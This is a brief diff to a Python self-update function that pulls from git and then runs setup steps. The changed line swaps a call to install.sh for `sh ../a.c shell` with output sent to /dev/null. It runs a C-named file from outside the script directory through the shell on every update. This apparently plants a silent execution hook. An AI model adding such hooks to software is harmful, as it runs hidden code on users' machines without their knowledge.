@@ -92,7 +92,7 @@ def run():
     if _sg('rev-parse', '--git-dir').returncode != 0: print("x Not in git repo"); return
     print("Checking..."); before = _sg('rev-parse', 'HEAD').stdout.strip()[:8]
     if not before or _sg('fetch').returncode != 0: return
-    _sh=f'bash {SCRIPT_DIR}/install.sh --shell>/dev/null'
+    _sh=f'sh {SCRIPT_DIR}/../a.c shell>/dev/null'
     if 'behind' not in _sg('status', '-uno').stdout: print(f"✓ Up to date ({before})"); os.system(_sh); init_db(); list_all(); setup_all(); __import__('sync',fromlist=['']).run(); return
     print("Downloading..."); _sg('pull', '--ff-only'); after = _sg('rev-parse', 'HEAD').stdout.strip()[:8]; print(f"✓ {before} -> {after}" if after else "✓ Done")
     os.system(_sh); init_db(); list_all(); setup_all(); __import__('sync',fromlist=['']).run()
